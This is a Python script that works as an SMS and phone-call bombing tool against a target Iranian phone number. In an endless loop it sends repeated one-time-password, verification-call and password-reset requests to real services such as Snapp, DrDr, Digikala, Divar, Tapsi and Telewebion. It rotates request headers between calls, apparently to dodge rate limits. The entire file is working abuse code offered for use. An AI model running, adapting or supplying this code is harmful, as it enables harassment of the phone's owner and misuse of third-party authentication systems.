import time
import requests 
# import resource 
import random
from colorama import Fore as color  
import os
from rich import pretty
pretty.install()
from rich. prompt import Prompt
from rich. console import Console
console = Console()
from time import sleep
import winsound

from info import number,heads
try:
    
    if number.index("0") == 0 :
        while number.index("0") == 0 :
            print(color.RED+"It should not have zero")
            number = input(color.GREEN+" Enter the target number without 0: "+color.MAGENTA+"( 9057767099 )  ")
except :
    pass
rund = 0
numb = 0
os.system("cls")
while True :
    
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :
    

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
        
    #دکتر دکتر 
    

    doktor_number = {"phoneNumber":number,"userType":"PATIENT"}
    doktor = 'https://drdr.ir/api/registerEnrollment/verifyMobile'
    req_doktor = requests.post(doktor,json=doktor_number,headers=rhead)
    if req_doktor.status_code == 200:
        time.sleep(2)
        numb += 1
        print(color.GREEN+"DoktorDoktor---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"DoktorDoktor--- NOT ---SEND",color.GREEN+f"{numb}")

    # تماس دکتر دکتر
    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
    numb += 1
    print(color.GREEN+"DoktorDoktor---- CALL---SEND",color.RED+f"{numb}")
    if req_doktor_c.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")




    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    
    # تماس دکتر دکتر
    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
    numb += 1
    print(color.GREEN+"DoktorDoktor---- CALL---SEND",color.RED+f"{numb}")
    if req_doktor_c.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #دیجی کالا

    rhead = random.choice(heads)
    digi_number = {"backUrl":"/","username":number,"otp_call":"false"}
    digi = "https://api.digikala.com/v1/user/authenticate/"
    req_digi = requests.post(digi,json=digi_number,headers=rhead)
    if req_digi.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Digikala---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Digikala--- NOT ---SEND",color.GREEN+f"{numb}")


    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #namava
    rhead = random.choice(heads)
    namava_number = {"UserName":f"+98{number}"}
    namava = "https://www.namava.ir/api/v1.0/accounts/reset-passwords/by-phone/request"
    req_namava = requests.post(namava,json=namava_number,headers=rhead)
    if req_namava.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Namava---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Namava--- NOT ---SEND",color.GREEN+f"{numb}")
    # تماس دکتر دکتر
    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
    numb += 1
    print(color.GREEN+"DoktorDoktor---- CALL---SEND",color.RED+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_doktor_c.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    # دیوار 
    divar_number = {"phone": f"0{number}"}
    divar = "https://api.divar.ir/v5/auth/authenticate"
    req_divar = requests.post(divar,json=divar_number,headers=rhead)
    if req_divar.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Divar---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Divar--- NOT ---SEND",color.GREEN+f"{numb}")
    # تماس دکتر دکتر
    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
    numb += 1
    print(color.GREEN+"DoktorDoktor---- CALL---SEND",color.RED+f"{numb}")
    if req_doktor_c.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #lenz 
    lenz_number = {"msisdn":f"98{number}"}
    lenz = "https://api-v3.lenz.ir/api/v3/user-management/otp/register"
    rhead = random.choice(heads)
    req_lenz = requests.post(lenz,json=lenz_number,headers=rhead)
    if req_lenz.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Lenz---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Lenz--- NOT ---SEND",color.GREEN+f"{numb}")
    #aio
    aio_number = {"mobile":f"0{number}"}
    aio = "https://api.aionet.ir/v4/auth/otp"
    rhead = random.choice(heads)
    req_aio = requests.post(aio,json=aio_number,headers=rhead)
    if req_aio.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Aio---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Aio--- NOT ---SEND",color.GREEN+f"{numb}")
    #mambaik
    mam_number = {"mobile":f"0{number}","confirmKey":"","password":"","password_repeat":""}
    mam = "https://mymoodic.com/ac/v1/account/send-verification"
    rhead = random.choice(heads)
    req_mam = requests.post(mam,json=mam_number,headers=rhead)
    if req_mam.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Mamdik---SEND",color.RED+f"{numb}")
    else :
        print(color.RED+"Mamdik--- NOT ---SEND",color.GREEN+f"{numb}")
    # تماس دکتر دکتر
    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
    numb += 1
    print(color.GREEN+"DoktorDoktor---- CALL---SEND",color.RED+f"{numb}")
    if req_doktor_c.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #tapsi
    tapsi_number = {"credential":{"phoneNumber":f"0{number}","role":"PASSENGER"},"otpOption":"SMS"}
    tapsi = "https://api.tapsi.cab/api/v2.2/user"
    rhead = random.choice(heads)
    req_tapsi = requests.post(tapsi,json=tapsi_number,headers=rhead)
    if req_tapsi.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Tapsi---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Tapsi--- NOT ---SEND",color.GREEN+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    # تماس دکتر دکتر
    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
    numb += 1
    print(color.GREEN+"DoktorDoktor---- CALL---SEND",color.RED+f"{numb}")
    if req_doktor_c.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #دکتر تو 
    doktorto_number = {"mobile":number,"country_id":205}
    doktorto = "https://api.doctoreto.com/api/web/patient/v1/accounts/register"
    rhead = random.choice(heads)
    req_doktorto = requests.post(doktorto,json=doktorto_number,headers=rhead)
    if req_doktorto.status_code == 200 : 
        time.sleep(2)
        numb += 1
        print(color.GREEN+"Doktorto---SEND",color.RED+f"{numb}")
    else : 
        print(color.RED+"Doktorto--- NOT ---SEND",color.GREEN+f"{numb}")
    #
    # تماس دکتر دکتر
    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
    numb += 1
    print(color.GREEN+"DoktorDoktor---- CALL---SEND",color.RED+f"{numb}")
    if req_doktor_c.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #تلوبیون
    telewebion_number = {"code":"98","phone":number,"smsStatus":"default"}
    telewebion = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one?isForeign=true"
    rhead = random.choice(heads)
    req_telewebion = requests.post(telewebion,json=telewebion_number,headers=rhead)
    if req_telewebion.status_code == 200 : 
        time.sleep(2)
        numb += 1
        print(color.GREEN+"Telewebion---SEND",color.RED+f"{numb}")
    else : 
        print(color.RED+"Telewebion--- NOT ---SEND",color.GREEN+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    # تماس دکتر دکتر
    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
    numb += 1
    print(color.GREEN+"DoktorDoktor---- CALL---SEND",color.RED+f"{numb}")
    if req_doktor_c.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SEND",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SEND",color.GREEN+f"{numb}")
    #slip 
    
    rund += 1
    print(f"finish rund {rund}")
    winsound.Beep(500, 500)
    time.sleep(30)